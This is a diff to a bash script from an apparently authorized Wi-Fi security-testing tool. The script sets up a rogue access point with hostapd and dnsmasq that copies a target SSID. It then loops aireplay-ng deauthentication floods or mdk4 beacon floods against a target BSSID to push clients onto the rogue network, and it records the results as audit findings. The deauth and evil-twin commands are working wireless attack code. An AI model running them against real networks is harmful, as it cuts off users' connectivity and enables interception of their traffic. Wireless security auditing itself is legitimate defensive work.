@@ -87,7 +87,7 @@ DNSMASQ_LOG="${EVIDENCE_DIR}/${TC_ID}_dnsmasq.log"
 cat <<EOF > "$HOSTAPD_CONF"
 interface=$INTERFACE
 driver=nl80211
-ssid="$SSID"
+ssid=$SSID
 $BSSID_LINE
 hw_mode=g
 channel=${GUEST_CHANNEL:-6}
@@ -137,26 +137,22 @@ fi
 DNSMASQ_PID=$!
 
 # Roaming Catalyst Execution (Pre-launch for Window Mode)
-if [[ "$CATALYST" == "1" ]] && [[ -n "$TARGET_BSSID" ]]; then
-    echo -e "[*] Starting ${C_BOLD}Surgical Deauth Catalyst${C_RESET} against $TARGET_BSSID..."
+# Injection (deauth/CSA) requires the monitor-mode interface, not the managed AP interface.
+MON_IFACE="${MONITOR_INTERFACE:-}"
+if [[ "$CATALYST" == "1" ]] && [[ -n "$TARGET_BSSID" ]] && [[ -n "$MON_IFACE" ]]; then
+    echo -e "[*] Starting ${C_BOLD}Surgical Deauth Catalyst${C_RESET} against $TARGET_BSSID on $MON_IFACE..."
     (
         while true; do
-            if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
-                aireplay-ng --deauth 5 -a "$TARGET_BSSID" "$INTERFACE" || true
-            else
-                aireplay-ng --deauth 5 -a "$TARGET_BSSID" "$INTERFACE" > /dev/null 2>&1 || true
-            fi
+            aireplay-ng --deauth 5 -a "$TARGET_BSSID" "$MON_IFACE" > /dev/null 2>&1 || true
             sleep 20
         done
     ) &
     CAT_PID=$!
-elif [[ "$CATALYST" == "2" ]] && [[ -n "$TARGET_BSSID" ]] && command -v mdk4 &>/dev/null; then
-    echo -e "[*] Starting ${C_BOLD}CSA Catalyst${C_RESET} (mdk4) for $SSID..."
-    if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
-        mdk4 "$INTERFACE" b -n "$SSID" -c "${GUEST_CHANNEL:-6}" &
-    else
-        mdk4 "$INTERFACE" b -n "$SSID" -c "${GUEST_CHANNEL:-6}" > /dev/null 2>&1 &
-    fi
+elif [[ "$CATALYST" == "1" ]] && [[ -n "$TARGET_BSSID" ]] && [[ -z "$MON_IFACE" ]]; then
+    echo "[!] Deauth catalyst requested but MONITOR_INTERFACE not set — skipping catalyst."
+elif [[ "$CATALYST" == "2" ]] && [[ -n "$TARGET_BSSID" ]] && [[ -n "$MON_IFACE" ]] && command -v mdk4 &>/dev/null; then
+    echo -e "[*] Starting ${C_BOLD}CSA Catalyst${C_RESET} (mdk4) for $SSID on $MON_IFACE..."
+    mdk4 "$MON_IFACE" b -n "$SSID" -c "${GUEST_CHANNEL:-6}" > /dev/null 2>&1 &
     CAT_PID=$!
 fi
 
@@ -167,7 +163,7 @@ else
     # BACKGROUND
     hostapd "$HOSTAPD_CONF" > "$HOSTAPD_LOG" 2>&1 &
     HOSTAPD_PID=$!
-    sleep "$SCAN_TIME"
+    wait "$HOSTAPD_PID" 2>/dev/null || true
 fi
 
 # Responder Support Module
@@ -195,8 +191,19 @@ if grep -qi "authenticated" "$HOSTAPD_LOG"; then
         --rationale "Automatic connection to unauthorized Access Points allows full traffic interception."
 else
     echo -e "[+] Mission complete. No rogue connections identified."
+    "$ASTRA_BIN" record-finding \
+        --session-dir "$SESSION_DIR" \
+        --tc "$TC_ID" \
+        --type vulnerability \
+        --name "[F1] Audit Complete" \
+        --severity INFO \
+        --desc "Rogue AP deployed for SSID '$SSID' — no client automatically connected during the test window." \
+        --target "$SSID" \
+        --evidence "$HOSTAPD_LOG" \
+        --rationale "Clients not connecting to rogue APs may have credential-based portal protections, 802.1X, or WIDS alerting in place."
 fi
 
+"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "Mission Complete"
 
 # Hold window if in tactical mode so user can see final output/errors
 if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
